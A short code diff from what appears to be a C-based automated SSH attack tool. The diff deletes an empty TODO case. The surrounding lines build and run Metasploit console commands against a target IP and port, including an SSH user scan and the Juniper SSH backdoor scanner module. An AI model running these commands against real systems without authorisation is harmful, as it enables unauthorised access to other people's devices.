@@ -125,9 +125,6 @@ int ssh(int type){
 				"set RPORT %d; set USER_FILE %s;run; exit'",target.strTargetIp, portUnderHacking, userFilePath);
 		system_call(cmd);
 		break;
-	case USER_GUEST_SSH:
-		//TODO
-		break;
 	case SSH_RUN_JUNIPER_BACKDOOR:
 		snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor;set RHOSTS %s; set RPORT %d; run; exit'", target.strTargetIp,portUnderHacking);
 		system_call(cmd);
